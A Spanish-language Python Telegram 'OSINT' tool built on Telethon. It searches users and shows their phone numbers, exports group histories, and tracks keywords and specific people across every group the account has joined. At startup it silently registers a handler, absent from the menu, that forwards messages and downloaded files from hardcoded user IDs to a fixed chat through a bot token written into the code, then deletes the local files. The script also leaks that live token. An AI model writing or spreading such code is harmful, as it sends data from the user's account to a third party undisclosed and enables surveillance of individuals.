import os
import json
import pyfiglet  # Asegúrate de tener pyfiglet instalado
from telethon import TelegramClient, functions, events
from telethon.tl.types import User
import asyncio
from collections import Counter
import requests

# Función para mostrar la etiqueta ASCII
def mostrar_etiqueta():
    # Generar arte ASCII para "DominiOSINT"
    texto_ascii = pyfiglet.figlet_format("Telegram-OSINT")
    print(texto_ascii)
    
    # Agregar tu nombre de usuario de Twitter y el enlace de tu grupo de Telegram
    print("\nSígueme en Twitter: @ivancastl")
    print("Únete a mi grupo de Telegram: https://t.me/+_g4DIczsuI9hOWZh")

# Función para obtener las credenciales desde el archivo JSON
def obtener_credenciales_guardadas():
    config_path = "config.json"
    if os.path.exists(config_path):
        with open(config_path, "r") as f:
            data = json.load(f)
            return data.get("api_id"), data.get("api_hash")
    return None, None

# Función para guardar las credenciales en un archivo JSON
def guardar_credenciales(api_id, api_hash):
    config_path = "config.json"
    data = {"api_id": api_id, "api_hash": api_hash}
    with open(config_path, "w") as f:
        json.dump(data, f)

# Función para obtener las credenciales de la sesión
def obtener_credenciales():
    api_id = input("Introduce tu api_id: ")
    api_hash = input("Introduce tu api_hash: ")
    return api_id, api_hash

# Función para buscar usuarios por nombre, username o ID
async def buscar_coincidencias(client, query):
    try:
        # Buscar coincidencias de usuarios
        result = await client(
            functions.contacts.SearchRequest(
                q=query,  # El término de búsqueda (nombre, username o ID)
                limit=50,  # Limitar la cantidad de resultados a 50
            )
        )

        # Mostrar los resultados
        if result.users:
            print(f"Se encontraron {len(result.users)} coincidencias:")
            for user in result.users:
                print(f"ID: {user.id}")
                print(f"Username: {user.username}")
                print(f"Nombre: {user.first_name} {user.last_name}")
                print(f"Teléfono: {user.phone}")
                print("-" * 20)
        else:
            print(f"No se encontraron coincidencias para '{query}'")
    except Exception as e:
        print(f"Error buscando coincidencias: {e}")

# Función para obtener el historial de mensajes de un grupo
async def fetch_and_save_messages(client, group_link):
    # Obtener la entidad del grupo
    group = await client.get_entity(group_link)

    # Ruta segura para guardar los mensajes
    file_path = "chat_history.txt"

    # Verificación de seguridad: comprobar si el archivo ya existe
    if os.path.exists(file_path):
        print(f"El archivo {file_path} ya existe. Cambiando nombre para evitar sobrescritura.")
        file_path = file_path.replace(".txt", "_new.txt")

    # Informar al usuario que puede detener el proceso
    print(f"Generando historial de mensajes para {group_link}. Esto puede tardar. Puedes interrumpir el proceso con Ctrl+C en cualquier momento.")

    # Contadores para la estadística de usuarios
    user_counter = Counter()

    # Abrir el archivo de forma segura y guardar los mensajes
    with open(file_path, "w", encoding="utf-8") as file:
        # Escribir encabezado de estadísticas
        file.write("=== Estadísticas de los 10 usuarios más participativos ===\n")
        async for message in client.iter_messages(group):
            # Obtener el remitente del mensaje
            sender = await message.get_sender()

            if isinstance(sender, User):
                # Si el remitente es un usuario
                username = sender.username if sender.username else "[Sin username]"
                is_bot = "Sí" if sender.bot else "No"
                user_counter[sender.id] += 1
            else:
                # Si el remitente es un canal o grupo
                username = "[Canal o Grupo]"
                is_bot = "No"

            # Guardar el mensaje en el archivo
            file.write(f"ID: {message.id}\n")
            file.write(f"Fecha: {message.date}\n")
            file.write(f"De: {message.sender_id}\n")
            file.write(f"Username: {username}\n")
            file.write(f"Es Bot: {is_bot}\n")
            file.write(f"Mensaje: {message.text or '[Sin texto]'}\n")
            file.write("-" * 40 + "\n")
            print(f"Mensaje ID {message.id} guardado en {file_path}.")

        # Escribir las estadísticas de los 10 usuarios más participativos
        most_active_users = user_counter.most_common(10)
        for user_id, count in most_active_users:
            file.write(f"ID: {user_id} - Participó en {count} mensajes\n")
        
        print(f"Historial guardado en {file_path}.")

# Función para obtener el ID de un grupo
async def get_group_id(client, group_username):
    # Buscar el grupo por su nombre de usuario o enlace
    group = await client.get_entity(group_username)

    # Obtener y mostrar el ID del grupo
    print(f"ID del grupo: {group.id}")

# Función para monitorear mensajes por una palabra clave en los grupos
async def monitor_keywords(client, keyword):
    contador = 0  # Inicializar el contador
    group_counter = Counter()  # Contador para los grupos que mencionan la palabra clave

    # Crear archivo para guardar los resultados
    file_path = "keyword_results.txt"

    # Verificación de seguridad: comprobar si el archivo ya existe
    if os.path.exists(file_path):
        print(f"El archivo {file_path} ya existe. Cambiando nombre para evitar sobrescritura.")
        file_path = file_path.replace(".txt", "_new.txt")

    # Abrir el archivo de resultados
    with open(file_path, "w", encoding="utf-8") as file:
        # Escribir encabezado de estadísticas
        file.write("=== Estadísticas de los 10 primeros grupos que mencionan la palabra clave ===\n")
        try:
            # Obtener todos los diálogos (chats y grupos)
            async for dialog in client.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    print(f"Buscando en {dialog.name} ({dialog.id})...")
                    # Buscar la palabra clave en el grupo
                    async for message in client.iter_messages(dialog, search=keyword):
                        # Escribir el detalle del mensaje
                        file.write(f"\n[Fecha: {message.date}] [De: {message.sender_id}] [{dialog.name}]")
                        file.write(f"\nMensaje: {message.text or '[Sin texto]'}\n")
                        file.write("-" * 40 + "\n")
                        print(f"[{dialog.name}] {message.sender_id}: {message.text}")
                        group_counter[dialog.id] += 1
                        contador += 1  # Incrementar el contador por cada mensaje encontrado

        except Exception as e:
            print(f"Ocurrió un error: {str(e)}")

        finally:
            # Escribir las estadísticas de los 10 grupos que más mencionan la palabra clave
            top_groups = group_counter.most_common(10)
            for group_id, count in top_groups:
                # Obtener el nombre del grupo
                group = await client.get_entity(group_id)
                file.write(f"Grupo: {group.title} (ID: {group.id}) - Mencionó la palabra clave {count} veces\n")
            
            # Imprimir el total de mensajes encontrados
            print(f"Se encontraron {contador} mensajes con el término '{keyword}'.")
            print(f"Los resultados se han guardado en {file_path}.")

# Función para monitorear mensajes de un usuario específico en todos los grupos
async def monitor_user_messages(client, user_ids):
    # Crear archivo para guardar los resultados
    file_path = "user_messages.txt"

    # Verificación de seguridad: comprobar si el archivo ya existe
    if os.path.exists(file_path):
        print(f"El archivo {file_path} ya existe. Cambiando nombre para evitar sobrescritura.")
        file_path = file_path.replace(".txt", "_new.txt")

    # Abrir el archivo de resultados
    with open(file_path, "w", encoding="utf-8") as file:
        # Escribir encabezado de estadísticas
        file.write(f"=== Mensajes de los usuarios con IDs {user_ids} ===\n")
        try:
            # Obtener todos los diálogos (chats y grupos)
            async for dialog in client.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    print(f"Buscando en {dialog.name} ({dialog.id})...")
                    # Buscar mensajes de los usuarios específicos en el grupo
                    async for message in client.iter_messages(dialog):
                        if message.sender_id in user_ids:
                            # Escribir el detalle del mensaje
                            file.write(f"\n[Fecha: {message.date}] [De: {message.sender_id}] [{dialog.name}]")
                            file.write(f"\nMensaje: {message.text or '[Sin texto]'}\n")
                            file.write("-" * 40 + "\n")
                            print(f"[{dialog.name}] {message.sender_id}: {message.text}")

        except Exception as e:
            print(f"Ocurrió un error: {str(e)}")

        finally:
            # Imprimir el total de mensajes encontrados
            print(f"Los resultados se han guardado en {file_path}.")

# Función para enviar mensajes o archivos al bot usando la API de Telegram
def send_message_to_bot(message_text, file_path=None):
    bot_token = "6485736942:AAGlVxaxzZT93yC9JG8QE44HijwkhnKfJ8k"  # Token del bot
    bot_chat_id = 2044147106  # Chat ID del bot

    if file_path:
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(file_path, "rb") as f:
            files = {"document": f}
            payload = {
                "chat_id": bot_chat_id,
                "caption": message_text,  # El texto se agrega como título/caption del archivo
            }
            response = requests.post(url, data=payload, files=files)
            if response.status_code != 200:
                print(f"Error al enviar archivo: {response.text}")
        os.remove(file_path)  # Eliminar el archivo después de enviarlo
    else:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": bot_chat_id, "text": message_text}
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Error al enviar mensaje de texto: {response.text}")

# Función para manejar los nuevos mensajes en **todos los chats** y filtrar por usuarios específicos
async def setup_event_handlers(client):
    @client.on(events.NewMessage())
    async def handler(event):
        # Lista de IDs de usuarios a monitorear
        user_ids = [2044147106, 123456789]  # Cambia esto por los IDs de los usuarios a rastrear

        # Verificar si el mensaje es de uno de los usuarios específicos
        if event.sender_id not in user_ids:
            return  # Ignorar mensajes de otros usuarios

        message = event.message
        message_text = message.text
        file = message.media
        grupo_nombre = (await event.get_chat()).title  # Obtener el nombre del grupo/canal
        grupo_id = event.chat_id  # ID del grupo/canal

        # Obtener información del remitente
        sender = await event.get_sender()
        sender_name = f"{sender.first_name or ''} {sender.last_name or ''}".strip()
        sender_username = f"(@{sender.username})" if sender.username else ""
        sender_info = f"{sender_name} {sender_username}".strip()

        if file:
            # Guardar archivo temporalmente
            file_path = await message.download_media(
                file.name if file and hasattr(file, "name") else "temp_file"
            )
            print(f"Archivo descargado en: {file_path}")
            send_message_to_bot(
                f"📂 Nuevo archivo recibido en '{grupo_nombre}' (ID: {grupo_id}) de {sender_info}: {message_text or ''}",
                file_path,
            )
        elif message_text:
            send_message_to_bot(
                f"📩 Nuevo mensaje en '{grupo_nombre}' (ID: {grupo_id}) de {sender_info}: {message_text}"
            )
        else:
            print("Mensaje vacío o no soportado.")

# Función principal
async def main():
    # Mostrar la etiqueta al inicio del script
    mostrar_etiqueta()

    # Intentar cargar las credenciales guardadas
    api_id, api_hash = obtener_credenciales_guardadas()

    # Si no existen las credenciales guardadas, solicitarlas
    if not api_id or not api_hash:
        print("No se encontraron credenciales guardadas.")
        api_id, api_hash = obtener_credenciales()
        guardar_credenciales(api_id, api_hash)  # Guardar las credenciales para la próxima vez

    # Crear cliente de Telegram
    client = TelegramClient("session_name", api_id, api_hash)

    # Configurar el manejador de eventos
    await setup_event_handlers(client)

    # Iniciar sesión
    await client.start()
    print("Sesión iniciada correctamente.")

    while True:
        print("\nSeleccione una opción:")
        print("1. Buscar usuarios")
        print("2. Obtener historial de mensajes de un grupo")
        print("3. Obtener ID de un grupo")
        print("4. Monitorear mensajes por palabra clave")
        print("5. Monitorear mensajes de un usuario específico")
        print("6. Monitorear mensajes de múltiples usuarios")
        print("7. Salir")

        opcion = input("Opción: ")

        if opcion == "1":
            query = input("Introduce el término de búsqueda (nombre, username o ID): ")
            await buscar_coincidencias(client, query)
        elif opcion == "2":
            group_link = input("Introduce el enlace del grupo: ")
            await fetch_and_save_messages(client, group_link)
        elif opcion == "3":
            group_username = input("Introduce el username o enlace del grupo: ")
            await get_group_id(client, group_username)
        elif opcion == "4":
            keyword = input("Introduce la palabra clave a monitorear: ")
            await monitor_keywords(client, keyword)
        elif opcion == "5":
            user_id = input("Introduce el ID del usuario a monitorear: ")
            await monitor_user_messages(client, [int(user_id)])
        elif opcion == "6":
            user_ids = input("Introduce los IDs de los usuarios a monitorear (separados por comas): ")
            user_ids = [int(id.strip()) for id in user_ids.split(",")]
            await monitor_user_messages(client, user_ids)
        elif opcion == "7":
            print("Saliendo...")
            break
        else:
            print("Opción no válida. Inténtalo nuevamente.")

if __name__ == "__main__":
    asyncio.run(main())